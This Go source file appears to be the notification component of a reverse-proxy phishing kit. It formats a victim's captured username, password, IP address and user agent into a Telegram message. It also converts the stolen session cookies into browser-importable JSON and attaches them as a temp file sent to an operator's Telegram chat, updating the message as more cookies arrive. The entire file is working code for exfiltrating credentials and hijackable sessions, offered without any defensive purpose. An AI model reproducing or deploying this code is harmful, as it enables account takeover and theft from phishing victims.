package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   int64       `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			token := Token{
				Name:             tokenData["Name"].(string),
				Value:            tokenData["Value"].(string),
				Domain:           domain,
				HostOnly:         false,
				Path:             tokenData["Path"].(string),
				Secure:           false,
				HttpOnly:         tokenData["HttpOnly"].(bool),
				SameSite:         "lax",
				Session:          false,
				FirstPartyDomain: "",
				PartitionKey:     nil,
			}
			tokens = append(tokens, token)
		}
	}

	return tokens
}
func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session Session) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)

	}

	fmt.Println("Combined Tokens: ", string(result))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("✨ Session Information ✨\n\n"+

		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n"+
		"📦 Tokens are added in txt file and attached separately in message.\n",

		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}
func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	mu.Lock()
	// Check if the session is already processed
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[string(session.ID)]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[string(session.ID)] = true
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)
}
